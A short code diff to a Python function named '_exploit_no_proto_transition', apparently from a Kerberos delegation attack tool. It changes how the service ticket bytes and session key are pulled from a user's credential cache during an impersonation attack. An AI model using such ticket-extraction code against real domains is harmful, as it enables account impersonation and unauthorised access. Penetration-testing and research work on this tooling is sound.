@@ -302,8 +302,8 @@ def _exploit_no_proto_transition(
         return None
 
     user_ticket  = user_ccache.credentials[0]
-    ticket_bytes = user_ticket["ticket"].getData()
-    ticket_key   = user_ticket["keyblock"]["keyvalue"].getData()
+    ticket_bytes = user_ticket.ticket.getData()[4:]  # strip 4-byte CountedOctetString length prefix
+    ticket_key   = user_ticket.header["key"]["keyvalue"]
 
     # Extract the impersonated username from the ccache principal
     try:
